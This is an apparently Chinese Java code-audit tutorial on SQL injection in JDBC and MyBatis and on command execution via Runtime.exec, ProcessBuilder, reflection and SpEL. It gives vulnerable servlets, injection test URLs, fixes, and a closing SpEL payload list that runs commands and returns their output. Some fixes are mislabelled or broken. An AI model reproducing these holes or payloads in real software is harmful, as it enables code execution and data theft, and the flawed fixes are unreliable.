<img width="789" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/62627a9b-a0c3-4161-b3b6-79a5e4f437d3"># java代码审计
## 一、sql注入
1、通过一些关键字可以定位到SQL语句附近

```java
Statement
createStatement
PrepareStatement
like '%${
in (${
select
update
insert
```

### （一）、JDBC的SQL注入
#### 1、常规漏洞
实操--搭建springboot

<img width="794" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b09b9e0e-6afc-4ed4-aefd-154174bdbd60">
<img width="791" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/4f252ca1-3b58-439c-84c5-0085a45465fd">

配置数据库

<img width="795" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/c691650a-2816-44a6-8688-56ffe18f4b5f">

打开 src/main/resources/application.properties 配置文件，将以下数据库连接信息添加至配置中

```
#访问端口号
server.port=7070
#数据库连接信息
spring.datasource.url=jdbc:mysql://localhost:3306/java_sec-code?AllowPublicKeyRetrieval=true&useSSL=false&serverTimezone=UTC
spring.datasource.username=root
spring.datasource.password=root
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
```
<img width="1400" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/e8424abe-a179-4fcf-9d3a-2bf87917cc40">

在 src\main\java\com\example\demo\jdbcinjection 下新建一个名为 JdbcDynamicController 的 Java Class。
```
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@RequestMapping("/jdbcsql")
public class JdbcDynamicController {
    private static String driver = "com.mysql.cj.jdbc.Driver";
    //使用的是MySQL数据库的JDBC驱动，其类名是 "com.mysql.cj.jdbc.Driver"。这个驱动类负责与MySQL数据库建立连接。
    //用于从配置文件中读取属性值
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/dynamic")
    public String jdbcdynamic(@RequestParam("id") String id) throws ClassNotFoundException, SQLException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);
        Statement statement = conn.createStatement();
        String sql = "select * from user where user_id = '" + id + "'";
        ResultSet rs = statement.executeQuery(sql);
        //遍历结果集
        while (rs.next()) {
            String rsUsername = rs.getString("user_name");
            String rsPassword = rs.getString("password");
            String info = String.format("%s: %s\n", rsUsername, rsPassword);
            result.append(info);
        }
        rs.close();
        conn.close();
        return result.toString();



    }
}
```

<img width="794" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/2b29dedf-a768-49d0-b1ff-d69c853af360">

测试      
```
http://127.0.0.1:7070/jdbcsql/dynamic?id=3
```

<img width="686" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b575cb82-e798-41b8-b6b9-90ecf08ce4a7">
<img width="688" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/226677b2-447b-4336-ae04-3337c3ddde22">

漏洞修复

在 src\main\java\com\example\demo\jdbcinjection 下新建一个名为 JdbcPrepareStatement 的 Java Class

```java
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@RequestMapping("/jdbcsqld")
public class JdbcPrepareStatement {
    private static String driver = "com.mysql.cj.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/preSec")

    public String jdbcPreSec(@RequestParam("id") String id) throws ClassNotFoundException, SQLException {
        if (id == null || id.trim().isEmpty()) {
            return "Invalid id";
        }

        StringBuilder result = new StringBuilder();
        try {
            Class.forName(driver);
            Connection conn = DriverManager.getConnection(url, user_name, password);
            String sql = "select * from user where user_id=?";
            PreparedStatement preparedStatement = conn.prepareStatement(sql);
            preparedStatement.setString(1, id);

            ResultSet rs = preparedStatement.executeQuery();
            while (rs.next()) {
                String resUsername = rs.getString("user_name");
                String resPassword = rs.getString("password");
                String info = String.format("%s: %s\n", resUsername, resPassword);
                result.append(info);
            }
        } catch (Exception e) {
            // Log or handle the exception here
            return "Error occurred: " + e.getMessage();
        }

        return result.toString();
    }

    @RequestMapping("/preNot")
    public String jdbcPreNot(@RequestParam("id") String id) throws SQLException, ClassNotFoundException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);
        //还是直接进行了拼接 无效
        String sql = "select * from user where user_id = '" + id + "'";
        PreparedStatement preparestatement = conn.prepareStatement(sql);
        ResultSet rs = preparestatement.executeQuery();
        while (rs.next()) {
            String reUsername = rs.getString("user_name");
            String resPassword = rs.getString("password");
            String info = String.format("%s: %s\n", reUsername, resPassword);
            result.append(info);
        }
        rs.close();
        conn.close();
        return result.toString();

    }

}

```

正确的预编译代码效果：

```
http://127.0.0.1:7070/jdbcsqld/preNot?id=1%27or%201=1%23
```
<img width="841" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/1adf73a9-82ef-475f-945c-5d370d10641b">

错误的预编译代码效果：

```
http://127.0.0.1:7070/jdbcsqld/preSec?id=1%27or%201=1%23
```

<img width="808" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/2daf76ad-c596-4da2-a0c1-4079eead2ccd">

#### 2、order by注入

order by 语句用于对结果集进行排序。 order by 语句后面需要是字段名或者字段位 置。 在使用 PreparedStatement 预编译时，会将传递任意参数使用单引号包裹进而变为了字符串。 如果使用预编译方式执行 order by 语句，设置的字段名会被人为是字符串，而不再是字段名。 因此，在使用 order by 时，就不能使用 PreparedStatement 预编译了

新建一个名为 jdbcOrderby 的Java Class， 并键入以下代码

```java
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@RequestMapping("/jdbcsqlorderby")
public class jdbcOrderby {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;
    @RequestMapping("/PreOrderby")
    public String jdbcOrderby(@RequestParam("id") String id) throws
            ClassNotFoundException, SQLException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);
        String sql = "select * from user" + " order by " + id;
        PreparedStatement preparestatement = conn.prepareStatement(sql);
        ResultSet rs = preparestatement.executeQuery();
        while (rs.next()) {
            String reUsername = rs.getString("user_name");
            String resPassword = rs.getString("password");
            String info = String.format("%s: %s\n", reUsername, resPassword);
            result.append(info);
        }
        rs.close();
        conn.close();
        return result.toString();
    }
}

```
测试

```
http://127.0.0.1:7070/jdbcsqlorderby/PreOrderby?id=if(1=1,sleep(1),1)
```

<img width="919" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/35143a1d-2169-44d8-8697-c519b8f07720">

漏洞修复

```java
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import java.sql.*;

@RestController
@RequestMapping("/jdbcsqlorderbysec")
public class jdbcOrderbysec {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/PreOrderbysec")
    public String jdbcOrderby(@RequestParam("id") String id) {
        StringBuilder result = new StringBuilder();
        String sql = "select * from user order by ?";

        try (Connection conn = DriverManager.getConnection(url, user_name, password);
             PreparedStatement preparestatement = conn.prepareStatement(sql)) {

            preparestatement.setString(1, id);
            ResultSet rs = preparestatement.executeQuery();

            while (rs.next()) {
                String reUsername = rs.getString("user_name");
                String resPassword = rs.getString("password");
                String info = String.format("%s: %s\n", reUsername, resPassword);
                result.append(info);
            }

        } catch (SQLException e) {
            e.printStackTrace(); // or log the exception
            // Handle the SQL exception appropriately
            return "Error occurred: " + e.getMessage();
        }

        return result.toString();
    }
}


```

使用 `PreparedStatement`来安全地处理参数

<img width="870" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/dbafb023-b190-48a4-a44c-53f1afd7d038">

#### 3、like注入

```java
package com.example.sql.jdbc;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RestController;
import java.sql.*;

@RestController
@RequestMapping("/jdbcsqllike")
public class jdbcsqllike {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/vul")
    public String jdbclike(@RequestParam("id") String id) throws ClassNotFoundException, SQLException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);

        // Vulnerable code using concatenated string
        String sql = "SELECT * FROM user WHERE user_name LIKE '%" + id + "%'";

        PreparedStatement preparestatement = conn.prepareStatement(sql);
        ResultSet rs = preparestatement.executeQuery();

        while (rs.next()) {
            String reUsername = rs.getString("user_name");
            String resPassword = rs.getString("password");
            String info = String.format("%s: %s\n", reUsername, resPassword);
            result.append(info);
        }

        rs.close();
        conn.close();
        return result.toString();
    }
}

```

测试

```
http://127.0.0.1:7070/jdbcsqllike/vul?id=d
```

<img width="726" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/d24baf30-e04d-4d14-ade9-de323ad287f9">


```
http://127.0.0.1:7070/jdbcsqllike/vul?id=a
```

<img width="634" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/96961ac0-33c9-4aa2-a968-7cb6ef3c0946">

漏洞修复
```
package com.example.sql.jdbc;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RestController;
import java.sql.*;

@RestController
@RequestMapping("/jdbcsqllikesec")
public class jdbcsqllikesec {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/secure")
    public String jdbclikeSecure(@RequestParam("id") String id) {
        StringBuilder result = new StringBuilder();

        try (Connection conn = DriverManager.getConnection(url, user_name, password)) {
            // Secure code using parameterized query
            String sql = "SELECT * FROM users WHERE user_name LIKE ?";
            try (PreparedStatement preparestatement = conn.prepareStatement(sql)) {
                preparestatement.setString(1, "%" + id + "%");
                ResultSet rs = preparestatement.executeQuery();

                while (rs.next()) {
                    String reUsername = rs.getString("user_name");
                    String resPassword = rs.getString("password");
                    String info = String.format("%s: %s\n", reUsername, resPassword);
                    result.append(info);
                }
            }
        } catch (SQLException e) {
            e.printStackTrace(); // Log or handle the exception appropriately
            return "Error occurred: " + e.getMessage();
        }

        return result.toString();
    }
}

```
```
http://127.0.0.1:7070/jdbcsqllikesec/secure?id=a
```
<img width="585" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/71910765-686e-458d-ba4d-bf5aaab36fd5">


### （二）、Mybatis的SQL注入

MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎 所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映 射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。

在Mybatis中拼接SQL语句有两种方式：一种是占位符 #{} ，另一种是拼接符 ${} 。

 占位符 #{} ：对传入的参数进行预编译转义处理。类似JDBC中的 PreparedStatement 。 

拼接符 ${} ：对传入的参数不做处理，直接拼接，进而会造成SQL注入漏洞。

 #{} 可以有效防止SQL注入漏洞。 ${} 则无法防止SQL注入漏洞。 因此在我们对JavaWeb整合Mybatis系统进行代码审计时，应着重审计SQL语句拼接的地方。 除非开发人员的粗心对拼接语句使用了 ${} 方式造成的SQL注入漏洞。 

**在Mybatis中有几种场景是不能使用预编译方式的，比如： order by 、 in ， like 。**

#### 1、${}和\#{}

在MyBatis中，`${}`和`#{}`都用于在SQL语句中进行参数替换，但它们的工作方式不同，对于SQL注入有不同的影响。

1. **`${}`（字符串替换）:**

   - 在MyBatis中，`${}`用于简单的字符串替换。参数的值直接插入到SQL语句中，没有额外的处理。
   - 如果输入没有得到适当的验证或清理，这可能导致SQL注入。

   ```xml
   <!-- 使用 ${} 的示例 -->
   <select id="getUserById" resultType="User">
       SELECT * FROM users WHERE id = ${userId}
   </select>
   ```

   如果 `userId` 没有得到适当的验证，攻击者可以提供一个值来修改查询，从而导致SQL注入。

   ```java
   // Java代码中的使用示例
   Map<String, Object> paramMap = new HashMap<>();
   paramMap.put("userId", "1 OR 1=1");
   User user = sqlSession.selectOne("getUserById", paramMap);
   ```

   在这个例子中，如果 `userId` 没有得到适当的验证，它可能导致SQL注入，查询变为 `SELECT * FROM users WHERE id = 1 OR 1=1`，这将总是返回结果。

   

2. **`#{}`（预处理语句）:**

   - 在MyBatis中，`#{}`用于预处理语句中的参数替换。MyBatis会处理值，确保它们被适当地转义和清理。
   - `#{}`比`${}`更安全，有助于防止SQL注入。

   ```xml
   <!-- 使用 #{} 的示例 -->
   <select id="getUserById" resultType="User">
       SELECT * FROM users WHERE id = #{userId}
   </select>
   ```

   ```java
   // Java代码中的使用示例
   Map<String, Object> paramMap = new HashMap<>();
   paramMap.put("userId", "1 OR 1=1");
   User user = sqlSession.selectOne("getUserById", paramMap);
   ```

   在这种情况下，MyBatis将以一种防止SQL注入的方式处理参数替换，生成的查询将是 `SELECT * FROM users WHERE id = ?`。

**总结:**

- 尽可能使用 `#{}` 进行参数替换，以防止SQL注入。MyBatis会处理这些值，确保它们被适当地转义。
- 避免使用 `${}`，除非你确信输入已经得到适当的验证和清理，因为它会直接替换值到SQL语句中。

在使用用户输入时，请谨慎对待并在将其用于SQL语句之前验证/清理它们，以防止安全漏洞，如SQL注入。

mybatis中有些地方不能使用预编译的，这种场景下就容易出现sql注入漏洞：
```
动态 SQL 中的表名、列名：如果在动态 SQL 中使用 ${} 来表示表名、列名等标识符，因为这些标识符是在 SQL 解析阶段确定的，无法使用预编译参数来替换。
动态 SQL 中的 SQL 语句片段：例如在 <sql> 或 <selectKey> 等元素中使用 ${}，这些片段是在 SQL 解析阶段确定的，也无法使用预编译参数来替换。
动态 SQL 中的 ORDER BY 字段：如果在 ORDER BY 子句中使用 ${} 来表示排序字段，因为排序字段是在 SQL 解析阶段确定的，同样无法使用预编译参数来替换。
LIKE 操作中的模糊查询字符串：如果在 LIKE 操作中使用 ${} 来表示模糊查询的字符串，因为这个字符串是直接拼接到 SQL 语句中的，不会被预编译。
```
#### 2、orderby 注入
在 MyBatis 中，Order By 注入是一种常见的 SQL 注入攻击类型。这种攻击通常发生在使用动态 SQL 语句时，特别是当使用字符串拼接来构建 Order By 子句时。为了防止 Order By 注入，我们通常建议使用 `#{}` 来处理动态参数。

假设有一个 MyBatis 映射文件，其中有一个动态 SQL 语句用于构建 Order By 子句：

```java
// 由于使用#{}会将对象转成字符串，形成order by "user" desc造成错误，因此很多研发会采用${}来解决，从而造成SQL注入

@GetMapping("/vul/order")
public List<User> orderBy(String field, String sort) {
    return userMapper.orderBy(field, sort);
}

// xml方式
<select id="orderBy" resultType="com.best.hello.entity.User">
    select * from users order by ${field} ${sort}
</select>

// 注解方式
@Select("select * from users order by ${field} desc")
List<User> orderBy2(@Param("field") String field);
             
```

漏洞修复- 排序映射

```
<select id="orderBySafe" resultType="com.best.hello.entity.User">
    select * from users
    <choose>
        <when test="field == 'id'">
            order by id desc
        </when>
        <when test="field == 'user'">
            order by user desc
        </when>
        <otherwise>
            order by id desc
        </otherwise>
    </choose>
</select>
```

#### 3、like注入
```
<select id="list" resultType="com.itheima.pojo.Emp">
	select *
	from emp
	<where>
		<if test="name!=null and name!=''">
			name like '% $iname} %'

		</if>
		<if test="gender!=null">
			gender = #{gender}
		</if>
		<if test="begin!=null and end!=null">
			entrydate between #{begin} and #{end}
		</if>
	</where>
	order by update_time desc
</select>
```
安全写法：使用concat将%%与预编译组合起来。
```
<select id="list" resultType="com.itheima.pojo.Emp">
	select *
	from emp
	<where>
		<if test="name!=null and name!=''">

			name like concat('%',#{name},'%')
		</if>
		<if test="gender!=null">
			gender = #{gender}
		</if>
		<if test="begin!=null and end!=null">
			entrydate between #{begin} and #{end}
		</if>
	</where>
	order by update _time desc
</select>
```
## 二、命令执行

1、通过一些关键字可以定位到

```java
一、java命令执行函数
runtime
processBuilder
ScriptEngineManager
yaml
groovy
二、SPEL表达式  （使用SimpleEvaluationContext修复）
SpelExpressionParser （解析SpEL表达式的类）
StandardEvaluationContext（SpEL的EvaluationContext实现默认）
```

### （一）、java命令执行函数

####  1、runtime/exec

在 Java 代码审计中，`Runtime.exec()` 或 `ProcessBuilder` 的使用可能存在命令执行漏洞。这种漏洞通常发生在开发者接受用户输入并将其直接传递给这些执行外部命令的函数时，而未经过充分的验证和过滤。攻击者可以通过精心构造的输入来执行恶意命令，从而导致安全问题。

漏洞代码1

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class VulnerableCode {

    public void executeCommand(String userInput) {
        try {
            String command = "echo " + userInput;
            Process process = Runtime.getRuntime().exec(command);
//使用Java的Runtime类执行用户输入的命令，并返回一个Process对象。
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
          //创建一个BufferedReader对象reader，用于读取从Process对象返回的输入流。
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        VulnerableCode vulnerableCode = new VulnerableCode();
        String userInput = "Hello, World!"; // 用户输入，未经验证
        vulnerableCode.executeCommand(userInput);
    }
}

```

漏洞代码2

```java
package com.example.demo;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

@WebServlet("/rce1")//这是一个Servlet的注解
public class rce1Servlet extends HttpServlet {
  //定义一个名为rce1Servlet的类，它继承了HttpServlet类
    @Override//覆盖
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("utf-8");
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html; charset=utf-8");
        String cmd = req.getParameter("cmd");
        StringBuffer sb = new StringBuffer();
      //创建一个StringBuffer对象，用于存储命令的输出结果。
        BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while ((line=br.readLine())!=null){
            sb.append(line).append("</br>");
        }
      // 将读取到的每一行内容添加到StringBuffer中，并在每一行后面添加一个换行符。
        br.close();
        resp.getWriter().write(sb.toString());
    }
}


```

漏洞触发

```
http://localhost:8080/rce1?cmd=calc
```

追踪三个函数的关系,直接跟进exec函数，一直“ctrl+点击exec”函数，最终可以跟到，是调用的ProcessBuilder类的start函数

<img width="926" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/37e53411-6ab3-4d9a-9135-f9a948ed367a">


继续跟进start函数，看到调用的是ProcessImpl.start

<img width="1009" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/ddc7eb29-9871-4c09-83d8-2d89da7a230d">


#### 2、processBuilder

对于 `ProcessBuilder`，攻击者可能会通过在命令或参数中插入特殊字符来尝试执行恶意命令。

下面是一个展示漏洞的简单示例：

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class VulnerableProcessBuilder {

    public void executeCommand(String userInput) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("echo", userInput);
            //创建一个ProcessBuilder对象， 
            Process process = processBuilder.start();
            //使用ProcessBuilder启动一个新的进程
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
          //// 创建一个BufferedReader对象来读取进程的输出  
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        VulnerableProcessBuilder vulnerableProcessBuilder = new VulnerableProcessBuilder();
        String userInput = "Hello, World!"; // 用户输入，未经验证
        vulnerableProcessBuilder.executeCommand(userInput);
    }
}

```

漏洞案例2

```
package com.example.demo;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@WebServlet("/rce2")
public class rce2Servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("utf-8");
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html; charset=utf-8");
        String cmd = req.getParameter("cmd");
        String[] arrcmd={"cmd.exe","/c",cmd};
      //创建一个字符串数组"arrcmd"，其中包含三个元素
        StringBuffer sb = new StringBuffer();
      //创建一个StringBuffer对象，用于构建响应的HTML文本
        ProcessBuilder processBuilder= new ProcessBuilder(arrcmd);
        Process process = processBuilder.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line=br.readLine())!=null){
            sb.append(line).append("</br>");
        }
        br.close();
        resp.getWriter().write(sb.toString());
    }
}
```
#### 3、ProcessImpl

```
ProcessImpl类通常是为ProcessBuilder.start()创建新进程服务的，不能直接去调用。

看到ProcessImpl类构造器私有，所以不能直接对其进行实例化，为了演示可以用反射进行调用。

在获取到一个静态方法后，必须用setAccessible修改它的作用域，否则不能调用。 

```

```java
public class Demo {
    public static void main(String[] args){
        try {
            String[] cmds = {"calc"};
            Class clazz = Class.forName("java.lang.ProcessImpl");
          //使用Java的反射API获取名为"java.lang.ProcessImpl"的类的Class对象。这个类是Java的内置类，用于处理进程。
            Method method = clazz.getDeclaredMethod("start",
                    new String[]{}.getClass(),
                    Map.class,String.class,
                    ProcessBuilder.Redirect[].class,
                    boolean.class);
//在ProcessImpl类中获取一个名为"start"的方法，这个方法需要六个参数：一个String数组、一个Map对象、一个String对象、一个ProcessBuilder.Redirect数组、一个boolean对象。这些参数的类型都是通过类或接口名指定的。
            method.setAccessible(true);//设置方法为可访问，即使它是私有的。
            method.invoke(null,cmds,null,".",null,true);
//调用上面获取的方法，传入的参数分别是null、上面定义的命令数组、null、当前目录".", null和true。这行代码试图启动一个名为"calc"的命令，并在当前目录执行。
          
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}
```

**知识扩展**

调用`Runtime#exec()`来执行`calc`和`ipconfig`命令：Runtime.getRuntime().exec(command)

```java
import java.lang.reflect.Method;

public class ExecExample {
    public static void main(String[] args) {
        try {
            // 获取 Runtime 类的 Class 对象
            Class<?> clazz = Class.forName("java.lang.Runtime");

            // 获取 Runtime.getRuntime() 方法
            Method getRuntimeMethod = clazz.getMethod("getRuntime");

            // 调用 Runtime.getRuntime() 方法，获取 Runtime 实例
            Object runtime = getRuntimeMethod.invoke(null);
						//getRuntimeMethod是通过引用获取Runtime类的getRuntime方法。invoke(null)是调用该方法，并传递null作为调用者对象，因为getRuntime方法是静态方法，不需要实例即可调用。
          
            // 获取 exec 方法
            Method execMethod = clazz.getMethod("exec", String.class);
						//String.class是用于指定exec方法的参数类型，即要执行的系统命令
          
            // 执行 calc 命令
            execMethod.invoke(runtime, "calc");

            // 执行 ipconfig 命令
            execMethod.invoke(runtime, "ipconfig");
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}

```

漏洞修复

利用SecurityUtil.cmdfilter对传入的参数进行过滤，严格限制用户只能输入a-zA-Z0-9_-.字符

````java
public class SecurityUtil {
    public static String cmdfilter(String input) {
        // 使用正则表达式过滤，只允许a-zA-Z0-9-_字符和.
        return input.replaceAll("[^a-zA-Z0-9_\\-.]", "");
    }
}

@RestController
@RequestMapping("/rce")
public class RceController {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        // 使用cmdfilter对用户输入进行过滤
        String filteredCmd = SecurityUtil.cmdfilter(cmd);

        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(filteredCmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }
}
````

### （二）、SpEL表达式

Spring Expression Language（SpEL）是在Spring框架中引入的一种表达式语言，用于在运行时执行查询和操作对象图。SpEL支持在运行时查询和操作对象图，它可以用于各种用途，包括查询对象属性、调用对象方法、计算表达式等。

SpEL的用法有三种形式

```
一种是在注解@Value中；

一种是XML配置；

一种是在代码块中使用Expression。

各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入

```

以下是SpEL的一些基本特性和用法：

1. 基本语法

SpEL表达式使用`${}`作为定界符，可以嵌套使用。例如：

```java
// 字符串拼接
String expression = "Hello, #{'World' + '!'}. Today is #{T(java.time.LocalDate).now()}";
```

2. 访问属性

通过`.`操作符，可以访问对象的属性：

```java
// 访问对象属性
String expression = "person.name";
```

3. 调用方法

通过`()`操作符，可以调用对象的方法：

```java
// 调用对象方法
String expression = "person.sayHello()";
```

4. 字面值

支持字符串、数字、布尔值等字面值：

```java
// 字符串字面值
String expression = "'Hello, World!'";
// 数字字面值
String expression = "42";
// 布尔字面值
String expression = "true";
```

5. 集合操作

SpEL支持对集合的操作，例如访问列表元素、映射的键值对等：

```java
// 访问列表元素
String expression = "myList[0]";
// 访问映射的键值对
String expression = "myMap['key']";
```

6. 运算符

SpEL支持常见的运算符，如算术运算符、关系运算符、逻辑运算符等：

```java
// 算术运算
String expression = "5 + 2";
// 关系运算
String expression = "age > 18";
// 逻辑运算
String expression = "isMember and hasRole('ROLE_ADMIN')";
```

7. 类型

可以使用`T()`关键字获取Java类的静态方法或字段：

```java
// 获取当前日期
String expression = "T(java.time.LocalDate).now()";
```

8. 条件表达式

SpEL支持三元条件表达式：

```java
// 三元条件表达式
String expression = "isMember ? 'Member' : 'Not a Member'";
```

9. 正则表达式

SpEL支持对字符串进行正则表达式匹配：

```java
// 正则表达式匹配
String expression = "'hello123' matches '[a-z]+\\d+'";
```

10. 安全导航操作符

通过`?.`操作符，可以避免在访问可能为`null`的对象时抛出空指针异常：

```java
// 安全导航操作符
String expression = "person?.address?.city";
```



漏洞代码

```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class VulnerableSpelExample {

    public static void main(String[] args) {
        // 恶意的SPEL表达式，攻击者可以传入的数据
        String userInput = "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}";

        // 创建一个SPEL表达式解析器
        ExpressionParser parser = new SpelExpressionParser();

        // 解析用户输入的SPEL表达式
        Expression expression = parser.parseExpression(userInput);

        // 评估表达式并执行
        Object result = expression.getValue();

        System.out.println("Result: " + result);
    }
}

```

漏洞修复

SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换StandardEvaluationContext

```java
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

public class SecureSpelExample {

    public static void main(String[] args) {
        // 恶意的SPEL表达式，攻击者可以传入的数据
        String userInput = "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}";

         // 使用 SimpleEvaluationContext 创建 ExpressionParser
        ExpressionParser parser = new SpelExpressionParser();
        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();

        // 使用 ExpressionParser 解析用户输入，并在受限上下文中评估它
        try {
            Expression expression = parser.parseExpression(userInput);
            Object result = expression.getValue(context);
            System.out.println("Result: " + result);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}

```

其他

```java
、、正常无回显
T(java.lang.Runtime).getRuntime().exec("calc")
new java.lang.ProcessBuilder("calc").start()

、、正常有回显
new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "ipconfig /all").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()


、、模板的无回显，就将上面的payload放到“ #{} ”
#{T(java.lang.Runtime).getRuntime().exec("calc")}
#{new java.lang.ProcessBuilder("calc").start()}

、、模板有回显，就将上面的payload放到“ #{} ”
#{new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "ipconfig /all").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()}

```

## 三、文件上传

